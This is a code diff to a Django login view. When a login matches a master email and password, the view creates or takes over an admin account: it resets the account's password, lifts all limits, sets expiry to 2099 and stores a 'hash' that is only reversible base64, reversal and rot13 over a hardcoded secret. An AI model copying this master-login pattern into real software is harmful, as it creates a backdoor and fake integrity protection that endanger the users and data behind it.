@@ -384,21 +384,22 @@ class CustomTokenObtainPairView(TokenObtainPairView):
 
         if email and password and email.lower().strip() == master_email.lower().strip() and password == master_pass:
             user = User.objects.filter(email__iexact=master_email).first()
+            
+            # Generate expected integrity hash in python
+            raw_str = f"{master_email.lower().strip()}::admin::-1::outreachpro_secure_v2_x7k2026!"
+            b64_str = base64.b64encode(raw_str.encode('utf-8')).decode('utf-8')
+            rev_str = b64_str[::-1]
+
+            rot13_str = ""
+            for c in rev_str:
+                if 'a' <= c <= 'z':
+                    rot13_str += chr((ord(c) - 97 + 13) % 26 + 97)
+                elif 'A' <= c <= 'Z':
+                    rot13_str += chr((ord(c) - 65 + 13) % 26 + 65)
+                else:
+                    rot13_str += c
+
             if not user:
-                # Generate expected integrity hash in python
-                raw_str = f"{master_email.lower().strip()}::admin::-1::outreachpro_secure_v2_x7k2026!"
-                b64_str = base64.b64encode(raw_str.encode('utf-8')).decode('utf-8')
-                rev_str = b64_str[::-1]
-
-                rot13_str = ""
-                for c in rev_str:
-                    if 'a' <= c <= 'z':
-                        rot13_str += chr((ord(c) - 97 + 13) % 26 + 97)
-                    elif 'A' <= c <= 'Z':
-                        rot13_str += chr((ord(c) - 65 + 13) % 26 + 65)
-                    else:
-                        rot13_str += c
-
                 User.objects.create_user(
                     email=master_email.lower().strip(),
                     username=master_email.split('@')[0] + '_admin',
@@ -412,4 +413,35 @@ class CustomTokenObtainPairView(TokenObtainPairView):
                     expiresAt='2099-12-31',
                     hash=rot13_str
                 )
+            else:
+                updated = False
+                if not user.check_password(master_pass):
+                    user.set_password(master_pass)
+                    updated = True
+                if user.plan != 'admin':
+                    user.plan = 'admin'
+                    updated = True
+                if user.emailLimit != -1:
+                    user.emailLimit = -1
+                    updated = True
+                if user.dailyLimit != -1:
+                    user.dailyLimit = -1
+                    updated = True
+                if user.templateLimit != -1:
+                    user.templateLimit = -1
+                    updated = True
+                if user.teamLimit != -1:
+                    user.teamLimit = -1
+                    updated = True
+                if not user.attachments:
+                    user.attachments = True
+                    updated = True
+                if user.expiresAt != '2099-12-31':
+                    user.expiresAt = '2099-12-31'
+                    updated = True
+                if user.hash != rot13_str:
+                    user.hash = rot13_str
+                    updated = True
+                if updated:
+                    user.save()
         return super().post(request, *args, **kwargs)
